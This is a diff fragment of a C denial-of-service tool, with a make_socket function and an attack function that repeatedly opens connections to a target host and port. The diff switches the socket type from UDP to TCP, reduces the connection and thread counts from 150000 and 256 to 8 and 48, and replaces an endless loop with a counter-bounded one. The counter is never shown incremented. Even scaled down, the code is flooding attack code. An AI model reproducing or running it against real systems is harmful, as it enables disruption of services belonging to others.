@@ -16,7 +16,7 @@ int make_socket(char *host, char *port) {
 //	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
 	memset(&hints, 0, sizeof(hints));
 	hints.ai_family = AF_INET;
-	hints.ai_socktype = SOCK_DGRAM;
+	hints.ai_socktype = SOCK_STREAM;
 	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
 		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
 		exit(0);
@@ -46,16 +46,16 @@ void broke(int s) {
 	// do nothing
 }
 
-#define CONNECTIONS 150000
-#define THREADS 256
-
+#define CONNECTIONS 8
+#define THREADS 48
+int i;
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
 	int x, g=1, r;
 	for(x=0; x != CONNECTIONS; x++)
 		sockets[x]=0;
 	signal(SIGPIPE, &broke);
-	while(1) {
+	while(i < 10000) {
 		for(x=0; x != CONNECTIONS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
